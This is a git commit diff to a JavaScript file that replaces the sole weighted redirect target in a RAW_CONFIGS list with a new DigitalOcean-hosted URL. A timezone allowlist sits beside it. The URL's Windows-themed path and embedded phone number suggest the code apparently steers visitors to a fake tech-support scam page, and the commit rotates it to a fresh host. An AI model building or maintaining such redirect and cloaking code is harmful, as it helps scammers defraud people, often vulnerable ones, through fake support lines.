f84cd671459e6b35b9871594081a0c9c884519cb
paalakash <palaksh452@gmail.com>
2026-06-23 08:06:29 +0530

    Update RAW_CONFIGS with new URL

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://octopus-app-24xwm.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5330", weight: 1.0 }
+    { url: "https://monkfish-app-u4xr7.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5330", weight: 1.0 }
 
 ];
 
